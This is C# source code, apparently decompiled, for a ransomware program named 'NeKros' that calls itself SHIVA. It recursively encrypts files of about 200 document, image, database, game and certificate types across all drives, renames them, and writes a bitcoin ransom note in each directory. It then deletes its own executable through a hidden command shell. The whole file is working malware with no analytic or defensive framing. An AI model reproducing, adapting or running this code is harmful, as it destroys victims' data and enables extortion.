using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public class NeKros_Ransomeware
{
	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[18]
		{
			1, 1, 2, 2, 3, 3, 4, 4, 5, 5,
			6, 6, 7, 7, 8, 8, 9, 9
		};
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreateRandomString(int length, string str)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append(str[random.Next(str.Length)]);
		}
		return str.ToString();
	}

	public void EncryptFile(string filePath, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(filePath);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		try
		{
			File.WriteAllBytes(filePath, bytes2);
			string text = CreateRandomString(8, "abcdefghijklmnopqrstuvwxyz1234567890");
			File.Move(filePath, filePath + "." + text);
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[204]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png",
				".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
				".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp",
				".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass",
				".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb",
				".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map",
				".wmo", ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
				".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx",
				".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00",
				".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge",
				".kdb", ".db0", ".dba", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod",
				".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik",
				".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay", ".xxx", ".desc", ".py", ".m3u",
				".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem",
				".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
				".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2",
				".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr",
				".indd", ".ai", ".eps", ".pdf", ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd",
				".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk",
				".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc",
				".odm", ".odp", ".ods", ".odt"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains("Windows") && !directories[j].Contains("Program Files") && !directories[j].Contains("Program Files (x86)"))
				{
					encryptDirectory(directories[j], password);
					messageClient(directories[j]);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void start()
	{
		string userName = Environment.UserName;
		Environment.MachineName.ToString();
		string text = "C:\\Users\\";
		string str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/@^";
		CreateRandomString(15, str);
		string text2 = "\\Desktop";
		_ = text + userName + text2;
		string[] logicalDrives = Directory.GetLogicalDrives();
		Console.WriteLine("Using C# Directory Class,Available drives are:");
		for (int i = 0; i < logicalDrives.Length; i++)
		{
			encryptDirectory(logicalDrives[i].ToString(), "idk");
			messageClient(logicalDrives[i].ToString());
		}
		selfDestroy();
		if (Application.get_MessageLoop())
		{
			Application.Exit();
		}
		else
		{
			Environment.Exit(1);
		}
	}

	public void selfDestroy()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C timeout 2 && Del /Q /F " + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	public void messageClient(string path)
	{
		string[] contents = new string[2] { "<html><body>Files has been encrypted with SHIVA", "Send me some bitcoins or say goodbye to your files...</body></html>" };
		try
		{
			File.WriteAllLines(path + "\\READ_IT.html", contents);
		}
		catch (Exception)
		{
		}
	}
}
